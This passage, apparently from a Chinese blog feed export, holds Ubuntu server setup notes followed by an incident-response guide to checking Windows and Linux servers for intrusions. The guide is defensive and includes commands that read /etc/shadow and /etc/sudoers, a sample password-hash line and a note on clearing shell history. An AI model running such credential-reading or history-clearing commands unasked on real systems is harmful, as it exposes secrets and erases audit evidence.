http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>然后更新源即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure><h3 id="安装php7-3"><a href="#安装php7-3" class="headerlink" title="安装php7.3"></a>安装php7.3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y php7.3</span><br><span class="line">sudo apt install php7.3-mysql php7.3-curl php7.3-json php7.3-cgi php7.3 libapache2-mod-php7.3</span><br><span class="line">sudo apt install php-mbstring php7.3-mbstring php-gettext</span><br></pre></td></tr></table></figure><h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mysql-server mysql-client</span><br><span class="line">安装成功验证</span><br><span class="line">sudo netstat -tap | grep mysql</span><br><span class="line">sudo netstat -ano | grep 3306</span><br></pre></td></tr></table></figure><p>PHPmyadmin需要前面安装php</p><h3 id="开机自启命令"><a href="#开机自启命令" class="headerlink" title="开机自启命令"></a>开机自启命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/systemd/system/rc-local.service</span><br></pre></td></tr></table></figure><p>ubuntu-18.04 默认是没有 /etc/rc.local 这个文件的，需要自己创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /etc/rc.local </span><br></pre></td></tr></table></figure><p>然后把你需要启动脚本写入 /etc/rc.local ，我们不妨写一些测试的脚本放在里面，以便验证脚本是否生效.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rc.local </span><br><span class="line">echo &quot;this just a test&quot; &gt; /usr/local/text.log </span><br></pre></td></tr></table></figure><p>参考资料</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_30624591/article/details/123426109</span><br><span class="line">https://blog.csdn.net/jxyk2007/article/details/109045615#报错</span><br></pre></td></tr></table></figure><h3 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install net-tools//ifconfig ping命令之类的</span><br><span class="line">sudo apt install vim       //vim</span><br><span class="line">sudo apt install apache2//apache2</span><br><span class="line"></span><br><span class="line">sudo systemctl restart apache2.service//重启apache2</span><br></pre></td></tr></table></figure><h3 id="特殊处理"><a href="#特殊处理" class="headerlink" title="特殊处理"></a>特殊处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@virtual-machine:~# chattr /etc/passwd</span><br><span class="line">Must use &#x27;-v&#x27;, =, - or +</span><br><span class="line">root@virtual-machine:~# chattr 777 /etc/passwd</span><br><span class="line">Must use &#x27;-v&#x27;, =, - or +</span><br><span class="line">root@virtual-machine:~# lsattr /etc/passwd</span><br><span class="line">----i---------e--- /etc/passwd</span><br><span class="line">root@virtual-machine:~# chattr -i /etc/passwd</span><br><span class="line">root@virtual-machine:~# lsattr /etc/passwd</span><br><span class="line">--------------e--- /etc/passwd</span><br><span class="line">root@virtual-machine:~# sudo chmod 777 /etc/passwd</span><br><span class="line">root@virtual-machine:~# vim /etc/passwd </span><br><span class="line">root@virtual-machine:~# sudo chmod 644 /etc/passwd</span><br><span class="line">root@virtual-machine:~# chattr +i /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="增大空间"><a href="#增大空间" class="headerlink" title="增大空间"></a>增大空间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_59128292/article/details/120787191</span><br></pre></td></tr></table></figure><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install cron</span><br></pre></td></tr></table></figure><ul><li>检测你的service路径</li></ul><p>执行命令 <code>which service</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu4146:/data/gitlabData/backups# which service</span><br><span class="line">/usr/sbin/service</span><br></pre></td></tr></table></figure><ul><li>执行相关 cron命令、带上路径 /usr/sbin/service</li></ul><p>比如执行命令 sudo /usr/sbin/service cron start ，启动 cron 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu4146:/data/gitlabData/backups# sudo /usr/sbin/service cron start </span><br><span class="line">start: Job is already running: cron</span><br></pre></td></tr></table></figure><p>上面命令返回 Job is already running: cron 表示 cron命令早已经在运行中</p><p>通常你可以通过执行命令 ps -ef | grep cron查看 cron命令是否正在运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu4146:/data/gitlabData/backups# ps -ef | grep cron</span><br><span class="line">root      1096     1  0 10:40 ?        00:00:00 cron</span><br><span class="line">root      2155 62366  0 10:45 pts/1    00:00:00 grep --color=auto cron</span><br></pre></td></tr></table></figure><p>执行命令 sudo /usr/sbin/service cron status , 查看crontab服务状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu4146:/data/gitlabData/backups# sudo /usr/sbin/service cron status</span><br><span class="line">cron start/running, process 1096</span><br></pre></td></tr></table></figure><p>执行命令 sudo /usr/sbin/service cron reload 重新 cron 服务配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu4146:/data/gitlabData/backups# sudo /usr/sbin/service cron reload</span><br></pre></td></tr></table></figure><p>执行命令 sudo /usr/sbin/service cron restart , 重新启动 cron 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu4146:/data/gitlabData/backups# sudo /usr/sbin/service cron restart </span><br><span class="line">cron stop/waiting</span><br><span class="line">cron start/running, process 1096</span><br></pre></td></tr></table></figure><p>执行命令 sudo /usr/sbin/service cron stop , 停止 cron 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu4146:/data/gitlabData/backups# sudo /usr/sbin/service cron stop</span><br><span class="line">cron stop/waiting</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应之入侵排查</title>
      <link href="/article/2022-07-03-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
      <url>/article/2022-07-03-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>学习一下应急响应之入侵排查。</p><span id="more"></span><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="window入侵排查"><a href="#window入侵排查" class="headerlink" title="window入侵排查"></a>window入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="/image/media/2022/secops/sum-1-1.png"></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 – 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="/image/media/2022/secops/sum-1-2.png"></p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED </p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p></li></ul><p><img src="/image/media/2022/secops/sum-1-3.png"></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 – 运行 – 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>没有签名验证信息的进程没有描述信息的进程进程的属主进程的路径是否合法CPU 或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​    b、查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器 – 选择对应进程 – 右键打开文件位置</p><p>​        运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​    d、<code>tasklist /svc</code>   进程 – PID – 服务</p><p>​    e、查看Windows服务所对应的端口：</p><p>​        %systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="/image/media/2022/secops/sum-1-4.png"></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Window 2003版本 C:\Documents and Settings</span><br><span class="line">Window 2008R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​        a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p><p>​        b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org/">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com/">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><h2 id="Linux-入侵排查"><a href="#Linux-入侵排查" class="headerlink" title="Linux 入侵排查"></a>Linux 入侵排查</h2><h3 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路-1"><a href="#0x01-入侵排查思路-1" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h4><p><strong>基本使用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件 /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件 /etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who     查看当前登录用户（tty 本地登陆  pts 远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line">userdel user       删除 user 用户</span><br><span class="line">userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure><h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><p><strong>基本使用：</strong></p><p>通过 .bash_history 文件查看帐号执行过的系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、root 用户的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class="line">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile 让配置生效</span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下，导出历史命令。</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h4><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">查看下 pid 所对应的进程文件路径，</span><br><span class="line">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br></pre></td></tr></table></figure><h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用 ps 命令，分析进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid </span><br></pre></td></tr></table></figure><h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令 